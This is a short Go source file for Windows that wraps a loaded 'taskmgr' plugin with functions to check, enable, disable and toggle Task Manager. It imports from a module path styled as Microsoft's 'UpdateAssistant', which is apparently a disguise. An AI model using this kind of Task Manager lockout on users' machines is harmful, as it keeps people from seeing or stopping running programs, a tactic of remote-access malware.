//go:build windows

package sysutil

import (
	"sync"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	taskmgrMu   sync.Mutex
	taskmgrPlug *loader.Plugin
)

func taskmgrDLL(fn func(*loader.Plugin)) {
	taskmgrMu.Lock()
	if taskmgrPlug == nil {
		p, err := loader.Load("taskmgr")
		if err == nil {
			taskmgrPlug = p
		}
	}
	p := taskmgrPlug
	taskmgrMu.Unlock()
	if p != nil {
		fn(p)
	}
}

func TaskMgrUnload() {
	taskmgrMu.Lock()
	defer taskmgrMu.Unlock()
	if taskmgrPlug != nil {
		loader.Unload(taskmgrPlug)
		taskmgrPlug = nil
	}
}

func TaskMgrStatus() string {
	raw := dllStrCall(taskmgrDLL, "taskmgr_status")
	r := parseDLLResult(raw)
	if r.Detail != "" {
		logger.Error("taskmgr status: %s (%s)", r.Status, r.Detail)
	}
	return r.Status
}

func TaskMgrEnable() bool {
	raw := dllStrCall(taskmgrDLL, "taskmgr_enable")
	r := parseDLLResult(raw)
	if !r.OK {
		logger.Error("taskmgr enable failed: %s", r.Detail)
	}
	return r.OK
}

func TaskMgrDisable() bool {
	raw := dllStrCall(taskmgrDLL, "taskmgr_disable")
	r := parseDLLResult(raw)
	if !r.OK {
		logger.Error("taskmgr disable failed: %s", r.Detail)
	}
	return r.OK
}

func TaskMgrToggle() (string, bool) {
	return dllToggle(taskmgrDLL, "taskmgr_status", "taskmgr_enable", "taskmgr_disable")
}
